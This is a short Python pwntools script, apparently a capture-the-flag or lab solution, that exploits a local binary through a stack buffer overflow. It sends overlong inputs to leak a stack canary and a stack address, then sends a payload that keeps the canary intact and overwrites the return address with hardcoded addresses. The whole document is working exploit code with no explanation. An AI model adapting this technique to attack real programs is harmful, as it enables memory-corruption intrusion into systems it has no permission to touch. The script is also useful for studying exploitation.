#!/usr/bin/python
from __future__ import print_function
import sys
from pwn import *


def main():
    responses = []

    p = process(sys.argv[1])

    p.sendline('A'*32)
    responses.append(p.recvline())
    canary = '\x00' + p.recv(3)

    p.sendline('A'*43)
    responses.append(p.recvline())
    stack_addr = p.recv(4)
 
    payload = 'A'*32 + canary + p32(0xf7dd03fc) + p32(0x0804a000) + stack_addr + p32(0x08048831)

    p.sendline(payload)
    responses.append(p.recvall())

    print()
    pretty_print('canary', canary)
    pretty_print('stack address', stack_addr)
    pretty_print('payload', payload)

    for res in responses:
        print(res, end='')

def pretty_print(tag, value):
    print("%s : %d %s %s" % (tag, len(value), value.encode('hex'), value))

if __name__ == '__main__':
    main()
